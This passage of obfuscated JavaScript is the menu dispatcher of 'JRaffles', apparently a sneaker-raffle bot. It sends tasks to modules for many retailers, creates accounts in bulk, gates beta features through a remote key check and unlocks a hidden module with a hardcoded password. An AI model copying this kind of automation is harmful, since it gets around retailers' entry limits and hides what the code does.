                                _0x138f58['shuffleTasks'] && await _0x498355(_0x3372ed), await _0x31332f['function'](_0x31332f, _0x3372ed, _0x5b9145);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x5b9145 = await _0xd175ab();
                                    await _0x31332f['function'](_0x31332f, _0x5b9145);
                                }
                            }
                        }
                    } catch (_0x599677) {
                        console['log'](_0x599677), await _0x497396(0x7d0);
                    }
                    return _0x57f3a5();
                }
                if (_0x3e5733[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                        var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5b9145 = await _0xd175ab(), _0x576620 = await _0x334a9f(_0x31332f);
                            _0x138f58['shuffleTasks'] && await _0x498355(_0x576620), await _0x31332f['function'](_0x31332f, _0x576620, _0x5b9145);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5b9145 = await _0xd175ab(), _0x576620 = await _0x334a9f(_0x31332f);
                                _0x138f58['shuffleTasks'] && await _0x498355(_0x576620), await _0x31332f['function'](_0x31332f, _0x576620, _0x5b9145);
                            }
                        }
                    } catch (_0x1cd7e5) {
                        console['log'](_0x1cd7e5), await _0x497396(0xfa0);
                    }
                    return _0x57f3a5();
                }
                if (_0x3e5733[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                        var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x5b9145 = await _0xd175ab(), _0x576620 = await _0x334a9f(_0x31332f);
                            _0x138f58['shuffleTasks'] && await _0x498355(_0x576620), await _0x31332f['function'](_0x31332f, _0x576620, _0x5b9145);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x5b9145 = await _0xd175ab(), _0x576620 = await _0x334a9f(_0x31332f);
                                _0x138f58['shuffleTasks'] && await _0x498355(_0x576620), await _0x31332f['function'](_0x31332f, _0x576620, _0x5b9145);
                            }
                        }
                    } catch (_0x3bee3b) {
                        console['log'](_0x3bee3b), await _0x497396(0xfa0);
                    }
                    return _0x57f3a5();
                }
                if (_0x3e5733[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                    var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x5b9145 = await _0xd175ab();
                        return await _0x31332f['function'](_0x31332f, _0x5b9145), _0x57f3a5();
                    }
                    var _0x5b9145 = await _0xd175ab(), _0x2ffba9 = await _0x334a9f(_0x31332f);
                    return _0x138f58['shuffleTasks'] && await _0x498355(_0x2ffba9), await _0x31332f['function'](_0x31332f, _0x2ffba9, _0x5b9145), _0x57f3a5();
                }
                if (_0x3e5733[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                    var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5b9145 = await _0xd175ab(), _0x2ffba9 = await _0x334a9f(_0x31332f);
                    return _0x138f58['shuffleTasks'] && await _0x498355(_0x2ffba9), await _0x31332f['function'](_0x31332f, _0x2ffba9, _0x5b9145), _0x57f3a5();
                }
                if (_0x3e5733[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                    var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5b9145 = await _0xd175ab(), _0x2ffba9 = await _0x334a9f(_0x31332f);
                    return _0x138f58['shuffleTasks'] && await _0x498355(_0x2ffba9), await _0x31332f['function'](_0x31332f, _0x2ffba9, _0x5b9145), _0x57f3a5();
                }
                if (_0x3e5733[taskModule]['name']['includes']('BACKDOOR')) {
                    try {
                        let _0x45cac0 = { 'headers': { 'content-type': 'application/json' } }, _0x85d916 = { 'key': _0x4613fc }, _0x37c72c = await _0x2aead5['post']('https://jraffles.herokuapp.com/beta', _0x85d916, _0x45cac0);
                        if (_0x37c72c['status'] != 0xc8)
                            throw new Error('No\x20Beta\x20Access..');
                        console['log']('Hello,\x20' + _0xc3fc3['cyan'](_0x9f5859) + '.\x20Beta\x20Access\x20Granted.'), await _0x497396(0x3e8);
                    } catch (_0xbb4aa5) {
                        return console['log']('No\x20Beta\x20Access.'), await _0x497396(0x7d0), _0x57f3a5();
                    }
                    taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                    var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction], _0x5b9145 = await _0xd175ab(), _0x5b56b9 = await _0x334a9f(_0x31332f);
                    return _0x138f58['shuffleTasks'] && await _0x498355(_0x5b56b9), await _0x31332f['function'](_0x31332f, _0x5b56b9, _0x5b9145), await _0x497396(0x1388), _0x57f3a5();
                }
                if (_0x3e5733[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                    var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5b9145 = await _0xd175ab(), _0x2ffba9 = await _0x334a9f(_0x31332f);
                    return _0x138f58['shuffleTasks'] && await _0x498355(_0x2ffba9), await _0x31332f['function'](_0x31332f, _0x2ffba9, _0x5b9145), _0x57f3a5();
                } else {
                    if (_0x3e5733[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                        var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x5b9145 = await _0xd175ab(), _0x3dcb17 = await _0x334a9f(_0x31332f);
                            return _0x138f58['shuffleTasks'] && await _0x498355(_0x3dcb17), await _0x31332f['function'](_0x31332f, _0x3dcb17, _0x5b9145), _0x57f3a5();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5b9145 = await _0xd175ab();
                                return await _0x31332f['function'](_0x31332f, null, _0x5b9145), _0x57f3a5();
                            }
                        }
                        ;
                    } else {
                        if (_0x3e5733[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                            var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction], _0x5b9145 = await _0xd175ab(), _0x5b56b9 = await _0x334a9f(_0x31332f);
                            return _0x138f58['shuffleTasks'] && await _0x498355(_0x5b56b9), await _0x31332f['function'](_0x31332f, _0x5b56b9, _0x5b9145), await _0x497396(0x1388), _0x57f3a5();
                        } else {
                            if (_0x3e5733[taskModule]['name'] == 'Google\x20Forms') {
                                try {
                                    let _0x516dc0 = { 'headers': { 'content-type': 'application/json' } }, _0x3eff62 = { 'key': _0x4613fc }, _0x46f2cd = await _0x2aead5['post']('https://jraffles.herokuapp.com/beta', _0x3eff62, _0x516dc0);
                                    if (_0x46f2cd['status'] != 0xc8)
                                        throw new Error('No\x20Beta\x20Access..');
                                    console['log']('Hello,\x20' + _0xc3fc3['cyan'](_0x9f5859) + '.\x20Beta\x20Access\x20Granted.'), await _0x497396(0x3e8);
                                } catch (_0x3eae75) {
                                    return console['log']('No\x20Beta\x20Access.'), await _0x497396(0x7d0), _0x57f3a5();
                                }
                                taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                                var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction], _0x5b9145 = await _0xd175ab(), _0x5b56b9 = await _0x334a9f(_0x31332f);
                                return _0x138f58['shuffleTasks'] && await _0x498355(_0x5b56b9), await _0x31332f['function'](_0x31332f, _0x5b56b9, _0x5b9145), await _0x497396(0x1388), _0x57f3a5();
                            } else {
                                if (_0x3e5733[taskModule]['name'] == 'OQIUM\x20Store') {
                                    taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                                    var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0) {
                                        var _0x5b9145 = await _0xd175ab(), _0x3dcb17 = await _0x334a9f(_0x31332f);
                                        return _0x138f58['shuffleTasks'] && await _0x498355(_0x3dcb17), await _0x31332f['function'](_0x31332f, _0x3dcb17, _0x5b9145), _0x57f3a5();
                                    } else {
                                        if (taskFunction == 0x1) {
                                            var _0x5b9145 = await _0xd175ab();
                                            return await _0x31332f['function'](_0x31332f, null, _0x5b9145), _0x57f3a5();
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x3e5733[taskModule]['name'] == 'BOUNCEWEAR') {
                                        taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                                        var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0)
                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x31332f);
                                        else {
                                            if (taskFunction == 0x1) {
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x3e5733[taskModule]['name'] == 'PATTA') {
                                            taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                                            var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x5b9145 = await _0xd175ab(), _0x529c31 = await _0x334a9f(_0x31332f);
                                                return _0x138f58['shuffleTasks'] && await _0x498355(_0x529c31), await _0x31332f['function'](_0x31332f, _0x529c31, _0x5b9145), _0x57f3a5();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x5b9145 = await _0xd175ab(), _0x529c31 = await _0x334a9f(_0x31332f);
                                                    return _0x138f58['shuffleTasks'] && await _0x498355(_0x529c31), await _0x31332f['function'](_0x31332f, _0x529c31, _0x5b9145), _0x57f3a5();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x3e5733[taskModule]['name'] == 'SLAM\x20JAM') {
                                                taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                                                var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x5b9145 = await _0xd175ab(), _0x446e97 = await _0x334a9f(_0x31332f);
                                                    return _0x138f58['shuffleTasks'] && await _0x498355(_0x446e97), await _0x31332f['function'](_0x31332f, _0x446e97, _0x5b9145), _0x57f3a5();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x5b9145 = await _0xd175ab(), _0x446e97 = await _0x334a9f(_0x31332f);
                                                        return _0x138f58['shuffleTasks'] && await _0x498355(_0x446e97), await _0x31332f['function'](_0x31332f, _0x446e97, _0x5b9145), _0x57f3a5();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x3e5733[taskModule]['name'] == 'KICKZ') {
                                                    taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                                                    var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x5b9145 = await _0xd175ab(), _0x3b630e = await _0x334a9f(_0x31332f);
                                                        return _0x138f58['shuffleTasks'] && await _0x498355(_0x3b630e), await _0x31332f['function'](_0x31332f, _0x3b630e, _0x5b9145), _0x57f3a5();
                                                    } else {
                                                        if (taskFunction == 0x1) {
                                                            var _0x5b9145 = await _0xd175ab(), _0x3b630e = await _0x334a9f(_0x31332f);
                                                            return _0x138f58['shuffleTasks'] && await _0x498355(_0x3b630e), await _0x31332f['function'](_0x31332f, _0x3b630e, _0x5b9145), _0x57f3a5();
                                                        }
                                                    }
                                                    ;
                                                } else {
                                                    if (_0x3e5733[taskModule]['name'] == 'KICKZ') {
                                                        taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                                                        var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                                                        console['clear']();
                                                        if (taskFunction == 0x0) {
                                                            var _0x5b9145 = await _0xd175ab(), _0x3b630e = await _0x334a9f(_0x31332f);
                                                            return _0x138f58['shuffleTasks'] && await _0x498355(_0x3b630e), await _0x31332f['function'](_0x31332f, _0x3b630e, _0x5b9145), _0x57f3a5();
                                                        } else {
                                                            if (taskFunction == 0x1) {
                                                                var _0x5b9145 = await _0xd175ab(), _0x3b630e = await _0x334a9f(_0x31332f);
                                                                return _0x138f58['shuffleTasks'] && await _0x498355(_0x3b630e), await _0x31332f['function'](_0x31332f, _0x3b630e, _0x5b9145), _0x57f3a5();
                                                            }
                                                        }
                                                        ;
                                                    } else {
                                                        if (_0x3e5733[taskModule]['name'] == 'ADIDAS\x20CONFIRMED') {
                                                            taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                                                            var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                                                            console['clear']();
                                                            if (taskFunction == 0x0 || taskFunction == 0x1 || taskFunction == 0x2 || taskFunction == 0x3 || taskFunction == 0x4) {
                                                                var _0x5b9145 = await _0xd175ab(), _0x4e0b42 = await _0x334a9f(_0x31332f);
                                                                return _0x138f58['shuffleTasks'] && await _0x498355(_0x4e0b42), await _0x31332f['function'](_0x4e0b42, _0x5b9145), _0x57f3a5();
                                                            }
                                                        } else {
                                                            if (_0x3e5733[taskModule]['name'] == 'Seven\x20Store')
                                                                return console['log']('returning\x20to\x20menu'), await _0x497396(0x3e8), _0x57f3a5();
                                                            else {
                                                                if (_0x3e5733[taskModule]['name'] == 'Paypal\x20Verification') {
                                                                    var _0x3a19dd = _0x3e5733[taskModule]['name'], _0x5b9145 = await _0xd175ab();
                                                                    return await _0x3573c7(_0x3a19dd, _0x5b9145), _0x57f3a5();
                                                                } else {
                                                                    if (_0x3e5733[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                        taskFunction = await _0x54a78d(_0x3e5733[taskModule]['modules']);
                                                                        var _0x31332f = _0x3e5733[taskModule]['modules'][taskFunction];
                                                                        return await _0x31332f['function'](_0x31332f), _0x57f3a5();
                                                                    } else {
                                                                        if (_0x3e5733[taskModule]['name'] == 'Change\x20Settings') {
                                                                            console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                            var _0x27ad3c = 0x0;
                                                                            for (const _0x2ecbdb in _0x138f58) {
                                                                                console['log']('(' + _0x27ad3c + ')\x20' + _0x2ecbdb + '\x20:\x20' + _0x138f58[_0x2ecbdb]), _0x27ad3c++;
                                                                            }
                                                                            console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x27ad3c + ')\x20Return\x20to\x20Main\x20Menu');
                                                                            var _0x96fb9a = await _0x598f58();
                                                                            if (_0x96fb9a == _0x27ad3c)
                                                                                return _0x57f3a5();
                                                                            console['clear'];
                                                                            var _0xb42561 = 0x0;
                                                                            for (var _0xd5fb73 in _0x138f58) {
                                                                                if (_0x96fb9a == _0xb42561) {
                                                                                    console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0xd5fb73 + '\x20:'), _0x138f58[_0xd5fb73] = await _0x58b5d4(), _0x44f9d7['writeFileSync']('../settings.json', JSON['stringify'](_0x138f58));
                                                                                    break;
                                                                                } else
                                                                                    _0xb42561++;
                                                                            }
                                                                            return console['log']('Settings\x20Saved!'), await _0x497396(0xbb8), _0x57f3a5();
                                                                        } else {
                                                                            if (_0x3e5733[taskModule]['name'] == 'Reload\x20Settings')
                                                                                return console['log']('Reloading\x20settings'), await _0x35ed90(), _0x57f3a5();
                                                                            else {
                                                                                if (taskModule == 0x45) {
                                                                                    _0x3e5733[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                                    var _0x53d242 = await _0x5c7630();
                                                                                    _0x53d242 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x33819c(), await afewFunction(_0x212832[_0x4d38f2], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x497396(0xbb8));
                                                                                } else {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x57f3a5();
            } catch (_0xe90752) {
                return console['log'](_0xe90752), await _0x497396(0x2710), _0x57f3a5();
            }
        } catch (_0x24ae67) {
            return console['log'](_0x24ae67), await _0x497396(0x3a98);
        }
}
;
_0x38ef83('JRaffles\x20' + _0x30d211);
try {
    _0x35ed90(), _0x59efe4();
} catch (_0x3050b4) {
    console['log'](_0x3050b4);
}